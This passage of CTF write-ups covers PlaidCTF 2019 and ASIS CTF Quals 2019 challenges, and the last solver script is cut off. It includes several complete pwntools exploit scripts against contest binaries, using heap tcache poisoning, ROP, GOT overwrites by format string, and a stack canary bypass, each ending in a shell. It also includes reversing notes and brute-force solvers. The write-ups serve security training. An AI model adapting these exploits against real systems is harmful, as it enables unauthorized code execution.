  do\n    {\n      v25 = (int)v24[1].p;\n      v26 = v24;\n      v24 = (string *)((char *)v24 + 48);\n      LODWORD(v24[-2].p) = v25;\n      v24[-2].len = v24[-1].field_18;\n      std::__cxx11::basic_string::_M_assign(v26, v24);\n      --next_to_end_len;\n    }\n    while ( next_to_end_len );\n  }\n}\nv27 = data.end;\nv28 = data.end[-1].p_buf;\n--data.end;\nif ( v28 )\n  operator delete[](v28);\nv15 = v27[-1].name.p;\nv27[-1].p_buf = 0LL;\nif ( v15 != (char *)&v27[-1].name.max_len )\n  goto LABEL_18;\n```\n\nThe loop body is a bit hard to understand due to compiler optimization, but it is clear if we look at assembly\n\n```assembly\nloc_555555555640:       ; get the next bufsize\nmov     eax, [rbx+20h]\nmov     rdi, rbx\nadd     rbx, 30h        ; rbx == next string\nmov     [rbx-40h], eax  ; set this bufsize as next bufsize\nmov     rax, [rbx-8]    ; get next buf\nmov     [rbx-38h], rax  ; this buf = next buf\nmov     rsi, rbx        ; this string = next string\ncall    _M_assign\nsub     rbp, 1\njnz     short loc_555555555640 ; get the next bufsize\n```\n\nI think this is the copy constructor of `kv`\n\n### Exploitation\n\nThe C++ heap is a bit messy since many copy constructor will be called, and a long `std::string` is constructed by continuously appending character, in which `malloc/free` may be called to extend the chunk size. I successfully constructed a leak by simply trial and error. :)\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./cppp\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"cppp.pwni.ng\", 7777)\n\nsh.recvuntil(\"Choice: \")\n\ndef add(name=\"1\", buf=\"2\"):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(name)\n\tsh.recvuntil(\"buf: \")\n\tsh.sendline(buf)\n\tsh.recvuntil(\"Choice: \")\n\ndef remove(idx):\n\tsh.sendline(\"2\")\n\tsh.recvuntil(\"idx: \")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"Choice: \")\n\ndef view(idx):\n\tsh.sendline(\"3\")\n\tsh.recvuntil(\"idx: \")\n\tsh.sendline(str(idx))\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"Choice: \")\n\treturn ret[:-1]\n\n#1. leak heap (don't need)\n# add() #0\n# add(\"uaf\") #1\n# remove(0) #1->0\n# heap_addr = u64(view(0) + '\\x00\\x00') - 0x13290\n# print hex(heap_addr)\n#now 0 is UAF don't touch it\n\n#2. leak libc, want UAF of unsorted bin\nadd() #0\nadd(\"U\" * 0x800, 'A' * 0x800) #1\nadd(\"sep\") #2 seperator\n#also, it seems in this operation the vector will be extended,\n#copy constructor of `kv` will also be called, \n#(btw I guess the source code did not use r-value reference in C++11)\n#I think it is this that makes leak possible\n#but it was found by trial and error initially\n\nremove(2)\nremove(0) # 1->0\n\nlibc_addr = u64(view(0) + '\\x00\\x00') - 0x3ebca0\nprint hex(libc_addr)\n\n#3. rewrite __free_hook and getshell\nadd() #1\nadd('\\x00', 'D' * 0xb0) #2\n\nremove(1)\nremove(1)\n#double free\n\n#0xc0 tcache poisoned\nadd('\\x00', p64(libc_addr + e.symbols[\"__free_hook\"]).ljust(0xb0, '\\x00'))\nadd('\\x00', p64(libc_addr + e.symbols[\"system\"]).ljust(0xb0, '\\x00'))\n\nsh.sendline(\"1\")\nsh.recvuntil(\"name: \")\nsh.sendline(\"/bin/sh\")\nsh.recvuntil(\"buf: \")\nsh.sendline(\"/bin/sh\")\n\nsh.interactive()\n```\n\n## 500 Reversing / Plaid Party Planning III 2 ##\n\n**Description**\n\n> [This binary](files/pppiii_450cfae15d4434c4f5fe320fae78ec40) has a fix for an unintentional solution. Let's keep the party going.\n> \n> NOTE: We have pushed an updated binary. This update fixes a bug in the check function and should hopefully make the check function easier to understand. The diff with the binary below should be minimal. Apologies.\n> \n> The previous Plaid Party Planning III 2 <a href=\"/files/pppiii-2454fc1645e9ffcee447eff7e6d5d2f2\" target=\"_blank\">binary</a>.\n\n**Files provided**\n\n - [`pppiii_450cfae15d4434c4f5fe320fae78ec40`](files/plaidpartyplanningiii2-pppiii_450cfae15d4434c4f5fe320fae78ec40)\n\n## 500 Reversing / Plaid Party Planning III ##\n\n**Description**\n\n> This year, we're having another party. We managed to come to a consensus to have [Indian food](files/pppiii-b73804b431586f8ecd4a0e8c0daf3ba6), but I can't figure out where everyone should sit. Can you help us make sure the dinner goes off without a hitch?\n\n**Files provided**\n\n - [`pppiii-b73804b431586f8ecd4a0e8c0daf3ba6`](files/plaidpartyplanningiii-pppiiib73804b431586f8ecd4a0e8c0daf3ba6)\n\n**Solution**\n\nThis is actually a very easy challenge, I don't know why it worth 500 points...\n\nIf we run the program, it will abort. After a little bit reverse engineering, it seems that we need to find the parameter input such that the abort will not be called, and then the flag will be generated.\n\n    cprint(&v32, (__int64)\"And I bought a ton of extra parmesan!\", v10, v11, v12, v13);\n    mysleep(&v32, 5uLL);\n    cprint(&v33, (__int64)\"Anyway, we brought you guys a gift.\", v14, v15, v16, v17);\n    mysleep(&v33, 1uLL);\n    cprint(&v32, (__int64)\"It's a flag!\", v18, v19, v20, v21);\n    mysleep(&v32, 5uLL);\n    ptr = (void *)sub_555555555524(func_tab);\n    cprint(\n      &func_tab[8].name,\n      (__int64)\"Let me take a look. It seems to say\\n\\tPCTF{%s}.\",\n      (__int64)ptr,\n      (__int64)&func_tab[8],\n      v23,\n      v24);\n\nThus what if we cancel the abort function by putting a `ret` instruction at the `plt` entry of `abort` function? Also to make it less deterministic I also cancelled the `mysleep` function. Then I ran it directly and it seems that a deadlock situation is created, but when I ran it using `gdb`, the flag is printed!\n\n## 250 Reversing / big maffs ##\n\n**Description**\n\n> Do you have enough memory? [big_maffs](files/big_maffs_63f40a7dafe4a8350c4c06478b3685fd)\n\n**Files provided**\n\n - [`big_maffs_63f40a7dafe4a8350c4c06478b3685fd`](files/bigmaffs-big_maffs_63f40a7dafe4a8350c4c06478b3685fd)\n\n## 50 Reversing / i can count ##\n\n**Description**\n\n> Let's do this together. You do know how to [count](files/i_can_count_8484ceff57cb99e3bdb3017f8c8a2467), don't you?\n\n**Files provided**\n\n - [`i_can_count_8484ceff57cb99e3bdb3017f8c8a2467`](files/icancount-i_can_count_8484ceff57cb99e3bdb3017f8c8a2467)\n\n**Solution**\n\n(TODO)\n\n## 250 Reversing / The .Wat ness ##\n\n**Description**\n\n> The .Wat ness is open for testing!\n> \n> <a href=\"http://watness.pwni.ng:7744/\" target=\"_blank\">http://watness.pwni.ng:7744/</a>\n> \n> When it came out in 2016, the Witness impressed with its ability to gradually teach new players the rules of the game by simply having them play it. With the .Wat ness, we take this just a small step further.\n\n**No files provided**\n\n## 280 Web / Triggered ##\n\n**Description**\n\n> I stared into the abyss of microservices, and it stared back. I found something utterly terrifying about the chaos of connections.\n> <br>\n> \"Screw this,\" I finally declared, \"why have multiple services when the database can do everything just fine on its own?\"\n> <br>\n> And so on that glorious day it came to be that everything ran in <a href=\"http://triggered.pwni.ng:52856/\" target=\"_blank\">plpgsql</a>.\n\n**No files provided**\n\n## 300 Web / Potent Quotables ##\n\n**Description**\n\n> I set up <a href=\"http://quotables.pwni.ng:1337\" target=\"_blank\">a little quotes server</a> so that we can all share our favorite quotes with each other. I wrote it in Flask, but I decided that since it's mostly static content anyway, I should probably put some kind of caching layer in front of it, so I wrote a [caching reverse proxy](files/potent_proxy_9b166042cc0a265a3749b8649e13fcea). It all seems to be working well, though I do get this weird error when starting up the server:\n> <pre>\n> * Environment: production\n> WARNING: Do not use the development server in a production environment.\n> Use a production WSGI server instead.\n> </pre>\n> I'm sure that's not important.\n> <br>\n> Oh, and don't bother trying to go to the /admin page, that's not for you.\n\n**Files provided**\n\n - [`potent_proxy_9b166042cc0a265a3749b8649e13fcea`](files/potentquotables-potent_proxy_9b166042cc0a265a3749b8649e13fcea)\n\n", "timestamp": "2025-10-24T11:39:22.205521"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-04-20-ASIS-CTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-20-ASIS-CTF-Quals/README.md", "content": "## \n\n## 83 Pwn / Silk Road I\n\nBrute-force crack the ID, secret must be numeric string so it does not take very long to crack\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\nbool sub_40140A(char *secret)\n{\n  size_t v1; // r12\n  size_t v2; // r12\n  bool ret; // al\n  int v4; // [rsp+1Ch] [rbp-34h]\n  int v5; // [rsp+34h] [rbp-1Ch]\n  int v6; // [rsp+38h] [rbp-18h]\n  int sint; // [rsp+3Ch] [rbp-14h]\n\n  sint = strtol(secret, 0LL, 10);\n  ret = 0;\n  if ( sint % (strlen(secret) + 2) || secret[4] != '1' )\n    return ret;\n  v6 = sint / 100000;\n  v5 = sint % 10000;\n  if ( 10 * (sint % 10000 / 1000) + sint % 10000 % 100 / 10 - (10 * (sint / 100000 / 1000) + sint / 100000 % 10) != 1\n    || 10 * (v6 / 100 % 10) + v6 / 10 % 10 - 2 * (10 * (v5 % 100 / 10) + v5 % 1000 / 100) != 8 )\n  {\n    return ret;\n  }\n  v4 = 10 * (v5 / 100 % 10) + v5 % 10;\n  if ( (10 * (v6 % 10) + v6 / 100 % 10) / v4 != 3 || (10 * (v6 % 10) + v6 / 100 % 10) % v4 )\n    return ret;\n  v1 = strlen(secret) + 2;\n  v2 = (strlen(secret) + 2) * v1;\n  if ( sint % (v5 * v6) == v2 * (strlen(secret) + 2) + 6 )\n    ret = 1;\n  return ret;\n}\n\nchar buf[0x100];\n\nint main(int argc, char const *argv[])\n{\n  for (size_t i = 0; i < 0x100000000; ++i)\n  {\n    snprintf(buf, sizeof(buf), \"%d\", (int)i);\n    if (sub_40140A(buf))\n      puts(buf);//790317143\n  }\n  return 0;\n}\n```\n\nNickname is not hard to get so I will skip it. Then there is a stack-overflow, which is easy.\n\n```python\nfrom pwn import *\n\ng_local=0\np = ELF(\"./silkroad.elf\")\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process(\"./silkroad.elf\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"82.196.10.106\", 58399)\n\ndef prepare():\n\tsh.recvuntil(\"ID: \")\n\tsh.send(\"790317143\")\n\tsh.recvuntil(\"nick: \")\n\tsh.send(\"DreadPirateRobertsXiz\\x00\")\n\tsh.recvuntil(\"delete evidince and run Silkroad!\\n\")\nprepare()\nsh.sendline(\"A\" * (64+8) + p64(0x401bab) + p64(p.got[\"puts\"]) + p64(p.plt[\"puts\"]) + p64(0x401AFD))\n\nleak = sh.recvuntil('\\n')\nlibc_addr = u64(leak[:-1] + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\nprepare()\nsh.sendline(\"A\" * (64+8) + p64(0x401B4B) + p64(0x401bab) + \\\n\tp64(libc_addr + next(e.search(\"/bin/sh\"))) + p64(libc_addr + e.symbols[\"system\"]) + p64(0))\n\nsh.interactive()\n```\n\n## 171 Pwn / Silk Road II\n\nSince many `strtol` is used, so I would guess this token is also numeric and it is also can be brute-force cracked, but this time I will load the ELF executable as a shared library and call the verification function directly.\n\n```c\n#include <stdio.h>\n#include <dlfcn.h>\n#include <memory.h>\ntypedef int (*func_t)(char *);\nchar buf[0x100];\nchar key[0x100];\n\n//to clear the stack of verification function, \n//because use of `strncpy` will cause uninitialized variable access (no null terminate)\n//which causes unexpected results if `strcat` is called to that string later\nvoid clear_stack()\n{\n\tchar buf[0x1000];\n\tmemset(buf, 0, sizeof(buf));\n}\n\nint main(int argc, char const *argv[])\n{\n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);\n\tfunc_t f = (func_t)(addr + 0x1C06);\n\tfor (int i = 0; i < 0x3b9aca00; ++i)\n\t{\n\t\tsprintf(buf, \"%.9d\", i);\n\t\tfor (int i = 0; i < 4; ++i)\n\t\t{\n\t\t\tkey[i] = buf[i];\n\t\t}\n\t\tfor (int i = 0; i < 5; ++i)\n\t\t{\n\t\t\tkey[6 + i] = buf[4 + i];\n\t\t}\n\t\tkey[4] = '1';\n\t\tkey[5] = '1';//4,5 must be length, which is always 11\n\t\tkey[11] = 0;\n\t\tclear_stack();\n\t\tif (f(key) == 1)\n\t\t\tputs(buf);\n\t}\n\treturn 0;\n}\n```\n\nThe vulnerability is format string vulnerability, when error message is printed if an invalid command is given. We can rewrite got table entry of `printf`, then hijack the `rip` and get shell using `one_gadget`\n\n```python\nfrom pwn import *\n\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process([\"./silkroad_2.elf\", \"flag{test}\"])\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"82.196.10.106\", 47299)\n\ndef hn(pos, val):\n\tassert val < 0x10000\n\tif val == 0:\n\t\treturn \"%\" + str(pos) + \"$hn\"\n\telse:\n\t\treturn \"%\" + str(val) + \"c%\" + str(pos) + \"$hn\"\n\ndef cont_shoot(poses, vals, prev_size = 0):\n\tassert len(poses) == len(vals)\n\tsize = len(poses)\n\tret = \"\"\n\ti = 0\n\tcur_size = prev_size\n\tnext_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000\n\twhile i < size:\n\t\tassert next_overflow >= cur_size\n\t\tnum = next_overflow - cur_size + vals[i]\n\t\tif num < 0x10000:\n\t\t\tret += hn(poses[i], num)\n\t\t\tnext_overflow += 0x10000\n\t\telse:\n\t\t\tnum = vals[i] - (cur_size - (next_overflow - 0x10000))\n\t\t\tassert num >= 0\n\t\t\tret += hn(poses[i], num)\n\t\tcur_size += num\n\t\ti += 1\n\treturn ret\n\nsh.recvuntil(\"Enter your token: \")\nsh.send(\"98831114236\")\nsh.recvuntil(\">> \")\nsh.sendline(\"1\")\n\nsh.recvuntil(\"admin: \")\n\ndef format_exp(payload):\n\tsh.sendline(payload)\n\tsh.recvuntil(\"invalid: \\\\\")\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"admin: \")\n\treturn ret[:-1]\n\nlibc_addr = int(format_exp(\"\\\\%2$p\")[2:], 16) - 0x3ed8c0\nprint hex(libc_addr)\n\n#mh = libc_addr + e.symbols[\"__malloc_hook\"]\n#format_exp('\\\\' + cont_shoot([mh, mh+2, mh+4], []))\n#sh.sendline(\"\\\\q\" + cyclic(128))\n#library function rewrites our input\n\nprog_addr = int(format_exp(\"\\\\%9$p\")[2:], 16) - 0x98d\nprint hex(prog_addr)\n\npg = prog_addr + 0x3f50 #printf got table entry\nsys = libc_addr + 0x10a38c#e.symbols[\"system\"]\n\nformat_exp(\"\\\\\" + cyclic(7) + 'A' * (8 * 8) + p64(0) * 2 + p64(pg) + p64(pg+2) + p64(pg+4))\n\nsh.sendline('\\\\' + cont_shoot([25, 26, 27], \\\n\t[sys & 0xffff, (sys >> 0x10) & 0xffff, (sys >> 0x20)], 0x11))\n\nsh.interactive()\n```\n\n## 182 Pwn / Silk Road III\n\nThe vulnerability is exactly same, but the verification is different.\n\n```c\nsigned __int64 __fastcall sub_1FCA(char *input)\n{\n  int v1; // eax\n  int v2; // ST1C_4\n  unsigned __int64 v3; // rbx\n  size_t v4; // r12\n  size_t v5; // r12\n  char v6; // bl\n  int v7; // ebx\n  int v8; // ebx\n  size_t v9; // rax\n  signed __int64 result; // rax\n  signed int i; // [rsp+14h] [rbp-4Ch]\n  signed int j; // [rsp+14h] [rbp-4Ch]\n  signed int k; // [rsp+14h] [rbp-4Ch]\n  signed int l; // [rsp+14h] [rbp-4Ch]\n  char _1337[5]; // [rsp+22h] [rbp-3Eh]\n  char v16[6]; // [rsp+27h] [rbp-39h]\n  char v17[6]; // [rsp+2Dh] [rbp-33h]\n  char haystack[6]; // [rsp+33h] [rbp-2Dh]\n  char v19[15]; // [rsp+39h] [rbp-27h]\n  unsigned __int64 v20; // [rsp+48h] [rbp-18h]\n\n  v20 = __readfsqword(0x28u);\n  haystack[5] = 0;\n  for ( i = 0; i <= 4; ++i )\n    haystack[i] = input[strlen(input) - 5 + i];\n  if ( !strstr(haystack, \"1337\") )              // 14:19\n    goto LABEL_23; //must contain 1337, and be either X1337 or 1337X\n  v1 = strtol(haystack, 0LL, 10);\n  v2 = 100 * (input[13] - '0') + 1000 * (input[6] - '0') + input[15] - '0';\n  v3 = v1;\n  v4 = strlen(input);\n  v5 = strlen(input) * v4;\n  if ( v3 % (strlen(input) * v5) != v2 ) \n    goto LABEL_23;// 1337XorX1337 % len**3 must have ten digit being 0\n  for ( j = 0; j <= 4; ++j )\n  {\n    v16[j] = input[j];\n    v17[j] = input[strlen(input) - 10 + j];\n  }\n  v16[5] = 0;\n  v17[5] = 0;\n  for ( k = 0; k <= 14; ++k )\n    v19[k] = input[k];\n  v19[14] = 0;\n  for ( l = 0; l <= 3; ++l )\n    _1337[l] = haystack[l + 1];\n  _1337[4] = 0;\n  if ( strstr(v19, _1337)\n    && (v6 = *input, v6 == input[strlen(input) - 8])// [0] == [11]\n    && (v7 = input[strlen(input) - 2] - 48,\n        v8 = input[strlen(input) - 3]\n           - 48                                 // [17] + [16] + [15] + 1 == [1]\n           + v7,\n        v8 + input[strlen(input) - 4] - 48 + 1 == input[1] - 48)\n    && (v9 = strlen(input), v9 == 19 * ((unsigned __int64)(0xD79435E50D79435FLL * (unsigned __int128)v9 >> 64) >> 4)) )// len must == 19\n  {\n    result = 1LL;\n  }\n  else\n  {\nLABEL_23:\n    result = 0xFFFFFFFFLL;\n  }\n  return result;\n}\n```\n\nActually the restriction is easier to bypass than second version, `X813373XXXXXX931337` can pass the check.\n\n```python\nfrom pwn import *\n\ng_local=0\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process([\"./ross.elf\", \"flag{test}\"])\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"82.196.10.106\", 31337)\n\ndef hn(pos, val):\n\tassert val < 0x10000\n\tif val == 0:\n\t\treturn \"%\" + str(pos) + \"$hn\"\n\telse:\n\t\treturn \"%\" + str(val) + \"c%\" + str(pos) + \"$hn\"\n\ndef cont_shoot(poses, vals, prev_size = 0):\n\tassert len(poses) == len(vals)\n\tsize = len(poses)\n\tret = \"\"\n\ti = 0\n\tcur_size = prev_size\n\tnext_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000\n\twhile i < size:\n\t\tassert next_overflow >= cur_size\n\t\tnum = next_overflow - cur_size + vals[i]\n\t\tif num < 0x10000:\n\t\t\tret += hn(poses[i], num)\n\t\t\tnext_overflow += 0x10000\n\t\telse:\n\t\t\tnum = vals[i] - (cur_size - (next_overflow - 0x10000))\n\t\t\tassert num >= 0\n\t\t\tret += hn(poses[i], num)\n\t\tcur_size += num\n\t\ti += 1\n\treturn ret\n\nsh.recvuntil(\"Enter your token: \")\nsh.send(\"X813373XXXXXX931337\")\nsh.recvuntil(\"your nick: \")\nsh.sendline(\"admin\")\nsh.recvuntil(\">> \")\nsh.sendline(\"1\")\n\nsh.recvuntil(\"admin: \")\n\ndef format_exp(payload):\n\tsh.sendline(payload)\n\tsh.recvuntil(\"invalid: \\\\\")\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"admin: \")\n\treturn ret[:-1]\n\nlibc_addr = int(format_exp(\"\\\\%2$p\")[2:], 16) - 0x3ed8c0\nprint hex(libc_addr)\n\n#mh = libc_addr + e.symbols[\"__malloc_hook\"]\n#format_exp('\\\\' + cont_shoot([mh, mh+2, mh+4], []))\n#sh.sendline(\"\\\\q\" + cyclic(128))\n#library function rewrites our input\n\nprog_addr = int(format_exp(\"\\\\%9$p\")[2:], 16) - 0x1E9D - 5\nprint hex(prog_addr)\n\npg = prog_addr + 0x5F68 #printf got table entry\nsys = libc_addr + 0x10a38c#e.symbols[\"system\"]\n\nformat_exp(\"\\\\\" + cyclic(7) + 'A' * (8 * 8) + p64(0) * 2 + p64(pg) + p64(pg+2) + p64(pg+4))\n\nsh.sendline('\\\\' + cont_shoot([25, 26, 27], \\\n\t[sys & 0xffff, (sys >> 0x10) & 0xffff, (sys >> 0x20)], 0x11))\n\nsh.interactive()\n```\n\nThe exploit is same, except some offset has been changed.\n\n## 116 Pwn / pwn 101\n\nVulnerability is off-by-one, we can use this to extend the chunk size of unsorted bin to create overlap to leak the `libc` address; then we can get the same chunk twice in 2 different indices, so we can use double free to poison `tcache bins` and rewrite `__free_hook`.\n\n```python\nfrom pwn import *\nfrom struct import unpack as up\ng_local=0\n#p = ELF(\"./pwn101.elf\")\ncontext(log_level='debug', arch='amd64')\n#e = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process(\"./pwn101.elf\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"82.196.10.106\", 29099)\n\nsh.recvuntil(\"> \")\ndef add(length, name, description=\"20192019\"):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"Description Length: \")\n\tsh.sendline(str(length))\n\tsh.recvuntil(\"Phone Number: \")\n\tsh.sendline(\"2019\")\n\tsh.recvuntil(\"Name: \")\n\tsh.send(name)\n\tsh.recvuntil(\"Description: \")\n\tsh.send(description)\n\tsh.recvuntil(\"> \")\n\ndef delete(idx):\n\tsh.sendline(\"3\")\n\tsh.recvuntil(\"Index: \")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"> \")\n\ndef show(idx):\n\tsh.sendline(\"2\")\n\tsh.recvuntil(\"Index: \")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"Description : \")\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"> \")\n\treturn ret[:-1]\n\nfor i in xrange(7):\n\tadd(0x200, 'name', 'fill tcache')\nadd(0x200, 'ab') #7\nfor i in xrange(7):\n\tdelete(i)\n\nadd(0x58, 'c', 'A' * 0x50 + p64(0x1f0)) #0\nadd(0x100, 'pad') #1\ndelete(7)\n\nadd(0x78, \"offbyone\", 'a' * 0x78 + '\\xf1') #2\n#0x191 -> 0x1f1\nadd(0x180, \"leak\") #3\nlibc_addr = u64(show(0) + '\\x00\\x00') - 0x3ebca0\nprint hex(libc_addr)\n#0x7fe5e1b31ca0 on server, so 2.27\n\nadd(0x50, '22', \"/bin/sh\") #4\n\ndelete(4)\ndelete(0)\n\nadd(0x50, 'consume', p64(libc_addr + 0x3ed8e8))#e.symbols[\"__free_hook\"]))\nadd(0x50, 'consume')\nadd(0x50, '/bin/sh\\x00', p64(libc_addr + 0x4f440))#e.symbols[\"system\"])) #5\n\nsh.sendline(\"3\")\nsh.recvuntil(\"Index: \")\nsh.sendline(str(5))\n\nsh.interactive()\n```\n\n##  104 Pwn / Precise average\n\nThe stack overflow is obvious, but we need to find ways to bypass canary protection. The key is to send `\"-\"` as the floating point number, which is invalid and `scanf` will return negative, but it will not rewrite the pointer passed as argument and leave it as it is. By using this technique canary will not be rewritten.\n\n```python\nfrom pwn import *\nfrom struct import unpack as up\ng_local=0\np = ELF(\"./precise_avg.elf\")\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process(\"./precise_avg.elf\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"82.196.10.106\", 12499)\n\npop_rdi = p64(0x4009c3)\nmain = p64(0x4007D0)\n\ndef exploit(rop):\n\tsh.recvuntil(\"Number of values: \")\n\n\tlength = 35 + len(rop)/8\n\tsh.sendline(str(length))\n\n\tfor i in xrange(35):\n\t\tsh.sendline(\"-\")\n\n\tfor i in xrange(0, len(rop), 8):\n\t\tsh.sendline(\"%.800f\" % up(\"<d\", rop[i:i+8])[0])\n\n\tsh.recvuntil(\"Result = \")\n\tsh.recvuntil('\\n')\n\nrop = pop_rdi\nrop += p64(p.got[\"puts\"])\nrop += p64(p.plt[\"puts\"])\nrop += main\nexploit(rop)\n\nleak = sh.recvuntil('\\n')\n\nlibc_addr = u64(leak[:-1] + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\nrop = p64(0x400958) #retn\nrop += pop_rdi\nrop += p64(libc_addr + next(e.search(\"/bin/sh\")))\nrop += p64(libc_addr + e.symbols[\"system\"])\nrop += p64(0)\n\nexploit(rop)\n\nsh.interactive()\n```\n\n## 287 Reverse / Mind Space\n\nThis is a C++ reverse engineering challenge. Fortunately the optimization is not enabled, otherwise many C++ built-in functions would be \"inlined\" and the codes would be very messy. The key is to recognize `std::vector`, `std::string` and `angles` structure.\n\n```c\nstruct angles\n{\n  _QWORD field_0;\n  _QWORD field_8;\n};//actually they are `double` type\nstruct vector\n{\n  angles *pointer;\n  angles *end;\n  angles *real_end;\n};\nstruct string\n{\n  char *pointer;\n  size_t len;\n  size_t maxlen_data;\n  __int64 field_18;\n};\n```\n\nI would not detail the C++ implementation here, if you want to know just search online or write some test codes with STL and reverse them.\n\nHere are some critical codes:\n\n```c\nwhile ( !std::basic_ios<char,std::char_traits<char>>::eof(&input_stream_256) )\n{\n  v17 = 0LL;\n  std::getline(input_stream, &flag);\n  v17 = string::find(&flag, \", \", 0LL);\n  string::substr(&v14, &flag, 0LL, v17);\n  string::operator_assign(&a1a, &v14);\n  string::string_des(&v14);\n  string::erase(&flag, 0LL, v17 + 1);\n  sndnum = string::strtod((__int64)&flag, 0LL);\n  a3 = sndnum - 80.0 - (double)i;\n  fstnum = string::strtod((__int64)&a1a, 0LL);\n  vector::push_back_withcheck(&a2, (double)i++ + fstnum - 80.0, a3);\n  // fstnum is modified and inserted as field_8, and sndnum is field_0\n}\n```\n\n```c\n__int64 __fastcall encode(string *a1, double a2)\n{\n  double v2; // ST00_8\n  bool v4; // [rsp+17h] [rbp-19h]\n  char v5; // [rsp+18h] [rbp-18h]\n  int v6; // [rsp+1Ch] [rbp-14h]\n\n  v2 = a2;\n  v6 = 2 * (signed int)round(100000.0 * a2);\n  if ( v2 < 0.0 )\n    v6 = ~v6;\n  string::string(a1);\n  do\n  {\n    v4 = v6 >> 5 > 0;\n    v5 = v6 & 0x1F;\n    if ( v6 >> 5 > 0 )\n      v5 |= 0x20u; // a little bit similar to uleb128 in android\n    string::operator_add(a1, (unsigned int)(char)(v5 + 0x3F));\n    v6 >>= 5;\n  }\n  while ( v4 );\n  return (__int64)a1;\n}\n```\n\nThis is the solving script\n\n```python\ndef read_flagenc():\n\tf = open(\"./flag.txt.enc\", \"rb\")\n\tret = f.read()\n\tf.close()\n\treturn map(ord, ret[:-1])\n\ndef recover_ints(data):\n\tret = []\n\ti = 0\n\toff = 0\n\tfor c in data:\n\t\tn = c - 0x3f\n\t\tif (n & 0x20) == 0:\n\t\t\ti += n << (5 * off)\n\t\t\tret.append(i)\n\t\t\ti = 0\n\t\t\toff = 0\n\t\telse:\n\t\t\tn -= 0x20\n\t\t\tassert n < 0x20\n\t\t\ti += n << (5 * off)\n\t\t\toff += 1\n\treturn ret\n\narr = recover_ints(read_flagenc())\n\ndef back_to_double(i):\n\tif i % 1000 == 999: # if it is originally negative\n\t\ti = -i - 1\n\tassert i % 1000 == 0 # % 2 == 0\n\treturn i / 2 / 100000.0\n\narr = map(back_to_double, arr)\n\nlast0 = 0.0\nlast1 = 0.0\nfor i in xrange(0, len(arr), 2):\n\tarr[i] += last1\n\tarr[i+1] += last0\n\tlast0 = arr[i+1]\n\tlast1 = arr[i]\n\t#arr[i],arr[i+1] = arr[i+1],arr[i]\n\nfor i in xrange(0, len(arr), 2):\n\tarr[i] = arr[i] + 80.0 - (i/2 + 1)\n\tarr[i+1] = arr[i+1] + 80.0 + (i/2 + 1)\n\nprint arr\nprint \"\".join(map(lambda x : chr(int(x)), arr))\n\nout = \"\"\nfor i in xrange(0, len(arr), 2):\n\tout += \"%.2f, %.2f\\n\" % (arr[i], arr[i+1])\n    # we know it is %.2f because it is the results are too close to it\n    # (something like xx.xx9999999 or xx.xx00000001)\n\nout = out[:-1]\n\nf = open(\"flag.txt\", 'wb')\nf.write(out)\nf.close()\n```\n\nThen we have a `flag.txt`, but how do we get the flag from it? After asking for help from organizers (well, they told me this so it was allowed :D), we knew that for a floating point number `aa.bb`, `bb` is index `aa` is `ascii` value, so we can get the flag.\n\n## 195 Reverse / Archimedes\n\nThis is the critical code that generate encrypted flag.\n\n```c\nwhile ( 1 )\n{\n  v23 = i;\n  if ( v23 >= string::size(&input) )\n    break;\n  v24 = sub_5555555577A7(0x10u, 8);\n  string::substr((__int64)&v52, (__int64)&v31, 2 * i, 2LL);\n  stringstream::stringstream(&v26, &v52, v24);\n  string::destructor((__int64)&v52);\n  std::istream::operator>>(&v26, &v28);\n  input_char = (_BYTE *)string::operator_index(&input, i);\n  string::operator_add(&v30, (unsigned int)(char)(v28 ^ *input_char ^ 0x8F ^ i++));\n  basic_stringstream::destructor(&v26);\n}\n```\n\nThis is basically `xor`, but `v28` is not dependent on current time instead of input flag, so we need to brute-force crack the `rand() % 0xffff` that produces the byte sequence that gives the correct flag after `xor` operation.\n\nBut how to get that byte sequence given a particular `unsigned short` value? My approach is to patch the binary. Firstly, let it accept the second argument as the value that should have been generated by `rand()`. This can be done by changing the assembly. However, we need `atoi` function but there is no such function imported in this binary. The way to solve this is to change the `\"srand\"` or `\"rand\"` string in symbol string table to `\"atoi\"`, so that the function becomes `atoi`. Also, we need to cancel the `xor` operation such that the byte sequence being outputted into file is not encrypted flag but the byte sequence generated from the second argument.\n\nWe get the flag using following script\n\n```python\nfrom os import system\n\ndef read_file(filename):\n\tf = open(filename, \"rb\")\n\tret 